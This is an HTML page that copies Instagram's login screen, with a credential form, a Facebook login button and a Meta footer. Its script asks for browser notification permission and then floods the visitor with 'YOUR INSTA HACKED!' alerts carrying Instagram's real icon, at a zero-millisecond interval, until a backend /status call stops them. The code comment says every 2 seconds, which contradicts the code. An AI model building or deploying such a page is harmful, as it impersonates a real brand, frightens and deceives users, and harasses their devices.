<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #007bb5;
        }
        .or {
            margin: 20px 0;
            position: relative;
        }
        .or::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dbdbdb;
        }
        .or span {
            background: white;
            padding: 0 10px;
            color: #8e8e8e;
        }
        .fb-login {
            background: #4267b2;
            margin-bottom: 20px;
        }
        .fb-login:hover {
            background: #365899;
        }
        a {
            color: #0095f6;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form>
            <input type="text" placeholder="Phone number, username, or email" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="or"><span>OR</span></div>
        <button class="fb-login">Log in with Facebook</button>
        <p><a href="#">Forgot password?</a></p>
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="footer">
        <p>Â© 2025 Instagram from Meta</p>
    </div>
    <script>
        // Request notification permission and start notifications
        if ('Notification' in window) {
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    let stopped = false;
                    const interval = setInterval(() => {
                        if (!stopped) {
                            new Notification('YOUR INSTA HACKED!', {
                                body: 'You have a new message.',
                                icon: 'https://www.instagram.com/static/images/ico/favicon-192.png'
                            });
                        }
                    }, 0); // Send notification every 2 seconds

                    // Poll the backend every second to check if stopped
                    const pollInterval = setInterval(() => {
                        fetch('/status')
                            .then(response => response.json())
                            .then(data => {
                                if (data.stop) {
                                    stopped = true;
                                    clearInterval(interval);
                                    clearInterval(pollInterval);
                                }
                            })
                            .catch(err => console.log('Error polling status:', err));
                    }, 1000);
                }
            });
        }
    </script>
</body>
</html>
